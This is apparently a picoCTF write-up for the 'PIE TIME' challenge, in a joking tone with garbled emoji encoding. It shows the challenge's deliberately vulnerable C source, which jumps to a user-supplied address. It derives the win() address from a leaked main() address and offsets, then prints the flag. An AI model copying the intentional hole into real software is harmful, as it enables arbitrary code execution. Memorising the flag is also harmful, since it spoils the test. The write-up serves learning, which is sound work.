---
description: 'Author: Darkraicg492'
---

# PIE TIME

***

### ðŸ“ Description

Can you get the flag? Bewareâ€¦ we got PIE ðŸ°

***

### ðŸ› ï¸ Step 1: Reconnaissance aka â€œchecksec go brrrâ€

Like every responsible hacker (or gremlin that touches random binaries at 3 AM), we start with:

```
â””â”€$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   78 Symbols        No    0               1               vuln
```

Boom ðŸ’¥ â€” it screams **PIE enabled**.\
Translation: â€œgood luck bro, addresses go brrrr every run.â€

I really recommend reading a bit of introduction about PIE so you can vibe along with me :P

Read here: [https://ir0nstone.gitbook.io/notes/binexp/stack/pie](https://ir0nstone.gitbook.io/notes/binexp/stack/pie)

***

### ðŸ“– Step 2: Peeking at the source code

The challenge was kind enough to hand us the source code (tysm challenge author, very generous ðŸ™).

```
void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main); // Print main address here

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

Key things to note:

*   Program literally asks you:

    ```
    Enter the address to jump to: 
    ```

    And then it justâ€¦ jumps there ðŸ’€. Like bruh, thatâ€™s the exploit.
* Thereâ€™s a **win()** function that does the gamer thing: prints the flag.
* But the binary is PIE, so win()â€™s address plays hide & seek every execution.

***

### ðŸ¤” So whatâ€™s the game plan?

We need the address of `win()`. But since PIE is here trolling us, we canâ€™t hardcode it.

Luckily, the program prints the address of `main()` each run.\
Thatâ€™s our anchor point.

#### Formulaâ„¢ï¸

```
base = main_address - main_offset
win_address = base + win_offset
```

***

### ðŸ” Step 3: Grab those offsets

Letâ€™s objdump this binary:

```
objdump -d vuln | grep ">:"
```

Output:

```
00000000000012a7 <win>:
000000000000133d <main>:
```

* win\_offset = `0x12a7`
* main\_offset = `0x133d`

***

### ðŸ§® Step 4: Put it all together

Say the program gives:

```
Address of main: 0x558860d7633d
```

We do some quick math (or just yeet it into Python because who does hex in their head lol):

```python
>>> hex((0x558860d7633d - 0x133d) + 0x12a7)
'0x558860d762a7'
```

Thatâ€™s our win() address ðŸŽ¯.

***

### ðŸŽ‰ Step 5: Profit (aka flag time)

Send that bad boy into the program:

```atom
â””â”€$ nc rescued-float.picoctf.net 54799
Address of main: 0x609e7137533d
Enter the address to jump to, ex => 0x12345: 0x609e713752a7
Your input: 609e713752a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_28a46dcd}
```

***

### ðŸ”‘ Key Takeaways&#x20;

* **PIE** = Position Independent Executable = addresses go brrrr each run.
* Use a **known leaked address** (like main) as your reference.
* Subtract the offset â†’ get base â†’ add target offset â†’ ðŸŽ¯ correct function address.
* Sometimes CTFs literally ask you for the address and let you win ðŸ˜‚.

***

âœ¨ Moral of the story: PIE may shift, but math donâ€™t lie. âœ¨

Again, I recommend reading some info here: [https://ir0nstone.gitbook.io/notes/binexp/stack/pie](https://ir0nstone.gitbook.io/notes/binexp/stack/pie)&#x20;
